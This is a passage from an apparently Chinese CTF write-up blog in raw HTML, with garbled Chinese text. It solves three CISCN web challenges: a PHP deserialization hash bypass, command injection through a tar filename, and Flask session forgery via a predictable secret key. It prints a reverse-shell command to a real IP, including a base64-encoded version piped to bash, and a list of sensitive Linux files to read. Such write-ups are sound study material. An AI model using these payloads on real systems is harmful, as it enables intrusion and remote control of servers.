class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è§¦å‘è¿™ä¸ªç±»ä¸­çš„wakeupæ–¹æ³•ï¼Œçœ‹è§å…³é”®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="number">12</span>) === <span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;12&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="number">1</span>) === <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;1&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;===&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;!=&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240717091858101.png" alt="image-20240717091858101"></p>
<p>æ­£åˆ™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$data=preg_replace(&#x27;/((\s)*(\n)+(\s)*)/i&#x27;,&#x27;&#x27;,file_get_contents($uuid));</span><br><span class="line">(\s)*: åŒ¹é…é›¶ä¸ªæˆ–è€…å¤šä¸ªç©ºç™½å­—ç¬¦ ç©ºæ ¼ åˆ¶è¡¨ç¬¦ æ¢é¡µç¬¦</span><br><span class="line">(\n)+: åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ¢è¡Œç¬¦</span><br><span class="line">/i : åŒ¹é…æ—¶ä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line">æŠŠä¸Šé¢åŒ¹é…åˆ°çš„å†…å®¹å…¨éƒ¨ç½®æ¢ä¸ºç©º</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸¤ä¸ªç‚¹</p>
<ul>
<li><p>dateå‡½æ•°å¯ä»¥è½¬ä¹‰</p>
</li>
<li><p><code>file_put_contents()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºå†™å…¥æ•°æ®åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚å¯ä»¥ä¸€æ¬¡å†™å…¥å…¨éƒ¨å†…å®¹ï¼Œè€Œä¸éœ€è¦æ‰“å¼€ã€å†™å…¥å’Œå…³é—­æ–‡ä»¶çš„å¤šä¸ªæ­¥éª¤ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($uuid,$content);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$uuid</code> å‚æ•°ä¼šè¢«ç”¨ä½œæ–‡ä»¶åã€‚ä¾‹å¦‚ï¼Œå¦‚æœ <code>$uuid</code> çš„å€¼æ˜¯ <code>&#39;abc123&#39;</code>ï¼Œé‚£ä¹ˆæ•°æ®å°±ä¼šè¢«å†™å…¥åˆ°åä¸º <code>&#39;abc123&#39;</code> çš„æ–‡ä»¶ä¸­ã€‚</li>
<li><code>$content</code> å‚æ•°æ˜¯ä½ æƒ³è¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å®ƒå¯ä»¥æ˜¯ä»»ä½•å¯ä»¥è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„å†…å®¹ã€‚</li>
</ul>
</li>
</ul>
<p>å› æ­¤å¾—åˆ°æœ€ç»ˆpayload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yiyi</span> = <span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="variable">$yiyi</span> -&gt; a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$yiyi</span> -&gt; b = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$yiyi</span> -&gt; file = <span class="string">&#x27;/f\l\a\g&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$yiyi</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717092802571.png" alt="image-20240717092802571"></p>
<h2 id="CISCN-2023-ååŒ—-pysym-1"><a href="#CISCN-2023-ååŒ—-pysym-1" class="headerlink" title="[CISCN 2023 ååŒ—]pysym"></a>[CISCN 2023 ååŒ—]pysym</h2><p>éšä¾¿ä¼ ä¸€ä¸ªçœ‹çœ‹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717093053044.png" alt="image-20240717093053044"></p>
<p>æŸ¥çœ‹æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ tar</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717094033026.png" alt="image-20240717094033026"></p>
<p>æ ¹æ®æºç ï¼Œåªæœ‰é™åˆ¶é•¿åº¦ï¼Œä¸Šä¼ åè°ƒç”¨ç³»ç»Ÿå‘½ä»¤å¯¹å…¶è¿›è¡Œï¼Œç”±äºæ²¡æœ‰æ–‡ä»¶åçš„é™åˆ¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> not in request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>(random.<span class="title function_ invoke__">choices</span>(<span class="keyword">string</span>.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.<span class="title function_ invoke__">join</span>(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.<span class="title function_ invoke__">makedirs</span>(directory, mode=<span class="number">0o755</span>, exist_ok=True)</span><br><span class="line">    savepath=os.path.<span class="title function_ invoke__">join</span>(directory, file.filename)</span><br><span class="line">    file.<span class="title function_ invoke__">save</span>(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="title function_ invoke__">format</span>(savepath,directory))</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªç‰¹æ€§è¿›è¡ŒRCE</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240717095108731.png" alt="image-20240717095108731"></p>
<p>æ²¡æœ‰å›æ˜¾ï¼Œè€ƒè™‘åå¼¹shell</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717105730290.png" alt="image-20240717105730290"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717110137582.png" alt="image-20240717110137582"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &gt;&amp; /dev/tcp/101.37.27.18/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.tar || echo  YmFzaCA+JiAvZGV2L3RjcC8xMDEuMzcuMjcuMTgvNDQ0NCAwPiYx| base64 -d | bash ||</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717110054704.png" alt="image-20240717110054704"></p>
<h2 id="CISCN-2019åä¸œå—-Web4-1"><a href="#CISCN-2019åä¸œå—-Web4-1" class="headerlink" title="[CISCN 2019åä¸œå—]Web4"></a>[CISCN 2019åä¸œå—]Web4</h2><p>æ–‡ä»¶è¯»å–</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717110852604.png" alt="image-20240717110852604"></p>
<p>å°è¯•è¯»å–&#x2F;etc&#x2F;passwd</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717110935262.png" alt="image-20240717110935262"></p>
<p>å°è¯•è¯»å–flagæ–‡ä»¶</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717111006796.png" alt="image-20240717111006796"></p>
<p>å¸¸è§linuxé…ç½®æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwdç”¨æ¥åˆ¤æ–­è¯»å–æ¼æ´çš„å­˜åœ¨</span><br><span class="line">/etc/environmentæ˜¯ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶ä¹‹ä¸€ã€‚ç¯å¢ƒå˜é‡å¯èƒ½å­˜åœ¨å¤§é‡ç›®å½•ä¿¡æ¯çš„æ³„éœ²ï¼Œç”šè‡³å¯èƒ½å‡ºç°secret keyæ³„éœ²çš„æƒ…å†µã€‚</span><br><span class="line">/etc/hostname/etc/hostnameè¡¨ç¤ºä¸»æœºåã€‚</span><br><span class="line">/etc/issueæŒ‡æ˜ç³»ç»Ÿç‰ˆæœ¬ã€‚</span><br><span class="line">/procç›®å½•</span><br><span class="line">/proc/[pid]æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">/proc/selfæŸ¥çœ‹å½“å‰è¿›ç¨‹</span><br><span class="line">/proc/self/cmdlineå½“å‰è¿›ç¨‹å¯¹åº”çš„ç»ˆç«¯å‘½ä»¤</span><br><span class="line">/proc/self/pwdç¨‹åºè¿è¡Œç›®å½•</span><br><span class="line">/proc/self/ç¯å¢ƒå˜é‡</span><br><span class="line">/sys/class/net/eth0/address macåœ°å€ä¿å­˜ä½</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å½“å‰è¿›ç¨‹å¯¹åº”çš„ç»ˆç«¯å‘½ä»¤</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717111305488.png" alt="image-20240717111305488"></p>
<p>ç›´æ¥è¯»</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717111345242.png" alt="image-20240717111345242"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">&#x27;^file.*|flag&#x27;</span>, url, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> urllib.request.urlopen(url) <span class="keyword">as</span> res:</span><br><span class="line">            <span class="keyword">return</span> res.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ç»å…¸sessionä¼ªé€ </p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717111948701.png" alt="image-20240717111948701"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Zpc0_w.WMwIMXtSU15Mlrk3Lwa0K8ZD810</span><br></pre></td></tr></table></figure>

<p>åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†</p>
<p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸¤æ®µbase64ï¼Œä½¿ç”¨è„šæœ¬å°†wwwæ›¿æ¢æˆfuckå³å¯ï¼Œä¸­é—´æ˜¯æ—¶é—´æˆ³ï¼Œæœ€åé¢æ˜¯å®‰å…¨ç­¾å</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717112310264.png" alt="image-20240717112310264"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot; b&quot;:&quot;d3d3LWRhdGE=&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot; b&quot;:&quot;www-data&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»macåœ°å€</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717113214241.png" alt="image-20240717113214241"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac02521c</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure>

<p>python2è¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/yiyi]</span><br><span class="line">â””â”€<span class="comment"># python2 test.py </span></span><br><span class="line">38.8837558332</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰å‘ï¼Œpython2å’Œ3è·‘å‡ºæ¥æ˜¯ä¸ä¸€æ ·çš„ï¼Œå®¹å™¨ä¸­ç”¨çš„æ˜¯2ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿåªèƒ½ç”¨2</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717123413345.png" alt="image-20240717123413345"></p>
<p>æ‹‰åˆ°flask_session_cookie_manager3.pyè·‘</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\31702\<span class="title">Desktop</span>\<span class="title">yiyi</span>\<span class="title">CTF</span>\<span class="title">web</span>\<span class="title">FLASK</span>æ¡†æ¶&gt;<span class="title">python</span> <span class="title">flask_session_cookie_manager3.py</span> <span class="title">encode</span> -<span class="title">s</span> 38.8837558332 -<span class="title">t</span> &quot;&#123;&#x27;<span class="title">username</span>&#x27;:&#x27;<span class="title">fuck</span>&#x27;&#125;&quot;</span></span><br><span class="line"><span class="function"><span class="title">eyJ1c2VybmFtZSI6ImZ1Y2sifQ.ZpdGqA.dt2f0F84oMxkjl0sQQK3_d8E3Xg</span></span></span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢åè·å¾—flag</p>
